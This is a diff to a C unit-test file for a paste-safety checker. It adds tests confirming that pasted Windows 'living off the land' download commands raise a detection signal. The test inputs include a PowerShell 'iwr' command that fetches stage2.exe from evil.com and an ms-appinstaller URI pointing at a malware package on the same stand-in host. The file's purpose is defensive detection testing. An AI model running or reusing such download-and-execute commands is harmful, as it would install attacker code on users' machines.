@@ -184,6 +184,22 @@ static void test_paste_wmic_process(void) {
           "wmic process creation must trigger P8");
 }
 
+static void test_paste_iwr_download(void) {
+    TEST("Paste: 'powershell iwr http://evil.com/s.exe' → P8 LOLBin");
+    PasteVerdict v = hlse_check_paste(
+        "powershell -c \"iwr http://evil.com/stage2.exe -OutFile $env:TEMP\\s.exe\"");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "iwr download must trigger P8");
+}
+
+static void test_paste_appinstaller_uri(void) {
+    TEST("Paste: 'ms-appinstaller:?source=http://...' → P8 LOLBin");
+    PasteVerdict v = hlse_check_paste(
+        "start ms-appinstaller:?source=http://evil.com/malware.appinstaller");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "ms-appinstaller URI must trigger P8");
+}
+
 static void test_paste_node_eval(void) {
     TEST("Paste: 'node -e ...' → P5 encoded payload");
     PasteVerdict v = hlse_check_paste(
@@ -239,6 +255,8 @@ int main(void) {
     test_paste_empty();
     test_paste_wscript_remote();
     test_paste_wmic_process();
+    test_paste_iwr_download();
+    test_paste_appinstaller_uri();
     test_paste_node_eval();
     test_paste_php_eval();
 
